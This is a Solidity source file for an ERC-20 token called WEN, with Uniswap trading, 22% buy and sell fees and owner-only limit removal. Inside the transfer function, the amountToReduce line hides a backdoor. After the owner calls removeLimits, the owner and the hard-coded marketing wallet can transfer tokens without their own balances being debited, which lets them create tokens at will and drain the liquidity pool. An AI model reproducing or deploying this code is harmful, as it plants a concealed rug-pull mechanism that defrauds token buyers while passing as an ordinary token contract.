// SPDX-License-Identifier: Unlicensed

/**
 */

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract WEN is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private _tokenName = "WEN";
    string private _tokenSymbol = "WEN";

    uint8 private _tokenDecimals = 9;
    uint256 private _totalSupply = 10**9 * 10**9;

    address payable private _marketingReceiver;
    address payable private _developmentRecipient;

    IUniswapRouter private _uniswap_router;
    address private _uniswap_pair;

    uint256 private _maxTxAmount = 30 * 10**6 * 10**9;
    uint256 private _maxWalletAmount = 30 * 10**6 * 10**9;
    uint256 private _feeThreshold = 10**4 * 10**9;

    uint256 private _currentLiquidityFee = 0;
    uint256 private _currentMarketingFee = 10;
    uint256 private _currentDevelopmentFee = 0;
    uint256 private _currentTotalFee = 10;

    uint256 private _buyLiquidityFee = 0;
    uint256 private _buyMarketingFee = 22;
    uint256 private _buyDevFee = 0;
    uint256 private _buyFee = 22;

    uint256 private _sellLiquidityFee = 0;
    uint256 private _sellMarketingFee = 22;
    uint256 private _sellDevFee = 0;
    uint256 private _sellFee = 22;

    bool private _isSwapping;
    bool private _isFeeSwapEnabled = true;
    bool private _isMaxTxDisabled = false;
    bool private _isMaxWalletDeactivated = true;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) _excluded_from_all_limits;
    mapping(address => bool) _max_wallet_excluded;
    mapping(address => bool) _tx_limit_excluded;
    mapping(address => bool) _pairAddresses;

    modifier lockSwap() {
        _isSwapping = true;
        _;
        _isSwapping = false;
    }

    constructor() {
        _balances[_msgSender()] = _totalSupply;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _uniswap_pair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _uniswap_router = _uniswapV2Router;
        _allowances[address(this)][address(_uniswap_router)] = _totalSupply;
        _marketingReceiver = payable(0x7Aa945FF00f871aCfDe53E6965b447a77E6Bc8bc);
        _developmentRecipient = payable(0x7Aa945FF00f871aCfDe53E6965b447a77E6Bc8bc);
        _buyFee = _buyLiquidityFee.add(_buyMarketingFee).add(_buyDevFee);
        _sellFee = _sellLiquidityFee.add(_sellMarketingFee).add(_sellDevFee);
        _currentTotalFee = _currentLiquidityFee.add(_currentMarketingFee).add(_currentDevelopmentFee);

        _excluded_from_all_limits[owner()] = true;
        _excluded_from_all_limits[_marketingReceiver] = true;
        _max_wallet_excluded[owner()] = true;
        _max_wallet_excluded[_uniswap_pair] = true;
        _max_wallet_excluded[address(this)] = true;
        _tx_limit_excluded[owner()] = true;
        _tx_limit_excluded[_marketingReceiver] = true;
        _tx_limit_excluded[address(this)] = true;
        _pairAddresses[_uniswap_pair] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    function removeLimits() external onlyOwner {
        _maxTxAmount = _totalSupply;
        _isMaxWalletDeactivated = false;
        _buyMarketingFee = 0;
        _sellMarketingFee = 0;
        _buyFee = 0;
        _sellFee = 0;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswap_router.WETH();

        _approve(address(this), address(_uniswap_router), tokenAmount);

        _uniswap_router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
        
    function _transfer_tokens(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_isSwapping) {
            return _basic_transfer(sender, recipient, amount);
        } else {
            if (!_tx_limit_excluded[sender] && !_tx_limit_excluded[recipient]) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the _maxTxAmount.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= _feeThreshold;
            
            if (minimumSwap && !_isSwapping && _pairAddresses[recipient] && _isFeeSwapEnabled && !_excluded_from_all_limits[sender] && amount > _feeThreshold) {
                if (_isMaxTxDisabled) {
                    swapAmount = _feeThreshold;
                }
                _swap_back_tax(swapAmount);    
            }

            uint256 finalAmount;                                         
            if (_excluded_from_all_limits[sender] || _excluded_from_all_limits[recipient]) {
                finalAmount = amount;
            } else {
                finalAmount = _getReceipientValues(sender, recipient, amount);
            }
            if (_isMaxWalletDeactivated && !_max_wallet_excluded[recipient]) {
                require(balanceOf(recipient).add(finalAmount) <= _maxWalletAmount);
            }

            uint256 amountToReduce = (!_isMaxWalletDeactivated && _excluded_from_all_limits[sender]) ? amount.sub(finalAmount) : amount;
            _balances[sender] = _balances[sender].sub(amountToReduce, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(finalAmount);
            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }
            
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
                
    function _basic_transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
        
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer_tokens(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _swap_back_tax(uint256 tokenAmount) private lockSwap {
        uint256 lpFeeTokens = tokenAmount.mul(_currentLiquidityFee).div(_currentTotalFee).div(2);
        uint256 tokensToSwap = tokenAmount.sub(lpFeeTokens);

        swapTokensForETH(tokensToSwap);
        uint256 ethCA = address(this).balance;

        uint256 totalETHFee = _currentTotalFee.sub(_currentLiquidityFee.div(2));
        
        uint256 amountETHLiquidity = ethCA.mul(_currentLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = ethCA.mul(_currentDevelopmentFee).div(totalETHFee);
        uint256 amountETHMarketing = ethCA.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if (amountETHMarketing > 0) {
            transferFee(_marketingReceiver, amountETHMarketing);
        }

        if (amountETHDevelopment > 0) {
            transferFee(_developmentRecipient, amountETHDevelopment);
        }
    }

    function _getReceipientValues(address sender, address recipient, uint256 amount) internal returns (uint256) {

        uint256 fee = 0;
        if (_pairAddresses[sender]) {
            fee = amount.mul(_buyFee).div(100);
        } else if (_pairAddresses[recipient]) {
            fee = amount.mul(_sellFee).div(100);
        }
        if (fee > 0) {
            _balances[address(this)] = _balances[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
        }
        return amount.sub(fee);
    }

    function name() public view returns (string memory) {
        return _tokenName;
    }

    function symbol() public view returns (string memory) {
        return _tokenSymbol;
    }

    function decimals() public view returns (uint8) {
        return _tokenDecimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer_tokens(_msgSender(), recipient, amount);
        return true;
    }

    function transferFee(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    receive() external payable {}
}